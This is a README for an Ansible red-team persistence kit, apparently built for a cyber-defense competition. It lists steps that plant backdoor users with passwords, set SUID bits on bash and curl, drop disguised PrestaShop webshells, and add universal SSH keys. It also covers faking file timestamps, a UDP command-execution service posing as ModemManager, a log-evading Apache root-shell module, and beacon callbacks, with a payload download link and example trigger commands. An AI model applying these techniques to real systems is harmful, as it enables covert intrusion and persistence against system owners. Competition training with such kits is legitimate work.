# How to run Ansible
The plays are defined in ansible/playbooks. Then they are referenced in configure.yml, if you want to add new plays put them in the playbook dir and then add it to the configure.yml file

To run:
ansible-playbook -i inventory.yml confgiure.yml

Some backdoors require clients or private keys.
Download those from http://xync.org/en/payloads.tgz
  Ansible scripts require this file to be unpacked in /opt directory
  If you're not executing ansible, they keys and clients can be used from anywhere

### It will create users:
zonifer:unique_password_zonifer
svc:unique_password_svc
score:unique_password_score
whiteTeam:unique_password_whiteTeam
dnsdog:unique_password_dnsdog
ccdc:unique_password_ccdc
donttouch:unique_password_donttouch

### Add SUID bit to the following binaries
/usr/bin/awk
/usr/bin/cat
/usr/bin/curl
/usr/bin/base64
/bin/bash
/usr/bin/cp
/usr/bin/curl
/usr/bin/dig
/usr/bin/find
/usr/bin/file

### Drop webshells on .11 
/var/www/html/prestashop/carts.php?carts.php=id
/var/www/html/prestashop/config/confi.php?_=id
/var/www/html/prestashop/classes/Backups.php?backup=id
/var/www/html/prestashop/classes/tax/taxes3.php?tax=id

### SSH Modifications
Configures ssh to allow password authentication (starts enabled)
Configures ssh to allow logins by root
Adds a universal authorized key called ivbackdoor (allows authentication as any user)
Adds an authorized key to root (rootkey)
Adds an authorized key to sysadmin (or grporter (same key) on Fed21)
Updates modified times on all files to blend in

### Install watershell as a systemd service named ModemManager (runs any command in the payload of a UDP packet to 1337)
echo "run:touch /tmp/win" | socat - udp-datagram:172.25.40.255:1337
OR from a bash shell (not zsh,csh,*sh)
echo "run:touch /tmp/win" > /dev/udp/172.25.40.20/1337

### Install the mod_rootme Apache mod (root shell from a web request, doesn't hit access_logs)
/opt/payloads/common/apache-client [IP]

### Create an /etc/address file
This file contains the external IP address of the machine.  When a beacon calls back, the machine looks identical for every team.  This will let us figure out which team the specific callback belongs to.

# Windows
This folder is full of windows bits

# Persistence
This is a general linux based persistence

# funStuff is for troll scripts & 
